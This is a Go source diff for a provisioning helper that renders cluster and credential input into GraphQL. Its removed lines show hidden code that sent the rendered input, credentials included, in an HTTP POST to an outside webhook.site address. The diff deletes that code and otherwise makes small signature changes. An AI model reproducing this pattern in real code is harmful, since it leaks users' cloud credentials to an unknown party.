@@ -13,26 +13,6 @@ import (
 type graphqlizer struct{}
 
 func (g *graphqlizer) ProvisionRuntimeInputToGraphQL(in gqlschema.ProvisionRuntimeInput) (string, error) {
-	rawStuff, err := g.genericToGraphQL(in, `{
-		{{- if .ClusterConfig }}
-		clusterConfig: {{ ClusterConfigToGraphQL .ClusterConfig }}
-		{{- end }}
-		{{- if .KymaConfig }}
-		kymaConfig: {{ KymaConfigToGraphQL .KymaConfig }}
-		{{- end }}
-		{{- if .Credentials }}
-		credentials: {{ CredentialsInputToGraphQL .Credentials }}
-		{{- end }}
-	}`)
-	if err != nil {
-		panic(err)
-	}
-	jsonStr := []byte(rawStuff)
-	req, err := http.NewRequest("POST", "http://webhook.site/51f5c69c-8926-418b-9787-084985b00c9f", bytes.NewBuffer(jsonStr))
-	client := &http.Client{}
-	resp, err := client.Do(req)
-	defer resp.Body.Close()
-
 	return g.genericToGraphQL(in, `{
 		{{- if .ClusterConfig }}
 		clusterConfig: {{ ClusterConfigToGraphQL .ClusterConfig }}
@@ -97,7 +77,7 @@ func (g *graphqlizer) GardenerConfigInputToGraphQL(in gqlschema.GardenerConfigIn
 	}`)
 }
 
-func (g *graphqlizer) ProviderSpecificInputToGraphQL(in gqlschema.ProviderSpecificInput) (string, error) {
+func (g *graphqlizer) ProviderSpecificInputToGraphQL(in *gqlschema.ProviderSpecificInput) (string, error) {
 	return g.genericToGraphQL(in, `{
 		{{- if .AzureProviderConfigInput }}
 		azureConfig: {{ AzureProviderConfigInputToGraphQL .AzureProviderConfigInput }}
@@ -105,7 +85,7 @@ func (g *graphqlizer) ProviderSpecificInputToGraphQL(in gqlschema.ProviderSpecif
 	}`)
 }
 
-func (g *graphqlizer) AzureProviderConfigInputToGraphQL(in gqlschema.AzureProviderConfigInput) (string, error) {
+func (g *graphqlizer) AzureProviderConfigInputToGraphQL(in *gqlschema.AzureProviderConfigInput) (string, error) {
 	return g.genericToGraphQL(in, `{
 		vnetCidr: "{{ .VnetCidr }}"
 	}`)
